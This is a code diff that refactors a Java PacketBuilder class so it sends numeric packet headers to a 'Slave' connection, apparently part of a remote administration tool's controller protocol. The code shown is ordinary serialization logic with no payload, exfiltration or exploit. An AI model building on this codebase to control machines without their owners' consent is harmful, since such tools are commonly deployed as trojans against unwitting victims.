@@ -5,11 +5,10 @@ import java.util.List;
 
 import com.redpois0n.Slave;
 import com.redpois0n.common.exceptions.PacketAlreadySentException;
-import com.redpois0n.plugins.PluginEventHandler;
 
 public class PacketBuilder {
 
-	private final String header;
+	private final short header;
 	private List<Object> list;
 	private boolean sent;
 	private boolean plugin;
@@ -26,12 +25,12 @@ public class PacketBuilder {
 		this(header.getHeader(), extra);
 	}
 
-	public PacketBuilder(String header, Object extra) {
+	public PacketBuilder(short header, Object extra) {
 		this(header, new Object[] { extra });
 	}
 
-	public PacketBuilder(String header, Object[] extra) {
-		String h = header;
+	public PacketBuilder(short header, Object[] extra) {
+		short h = header;
 		for (Object obj : extra) {
 			add(obj);
 		}
@@ -47,7 +46,7 @@ public class PacketBuilder {
 		list.add(obj);
 	}
 
-	public String getHeader() {
+	public short getHeader() {
 		return header;
 	}
 
@@ -57,14 +56,11 @@ public class PacketBuilder {
 			if (sent) {
 				throw new PacketAlreadySentException();
 			}
-
-			if (isPluginPacket()) {
-				slave.writeLine("-c " + header);
-			} else {
-				slave.writeLine(header);
-			}
 			
-			PluginEventHandler.onSendPacket(header, slave);
+			slave.writeInt(header);
+
+			
+			// TODO PluginEventHandler.onSendPacket(header, slave);
 
 			for (int i = 0; list != null && i < list.size(); i++) {
 				Object obj = list.get(i);
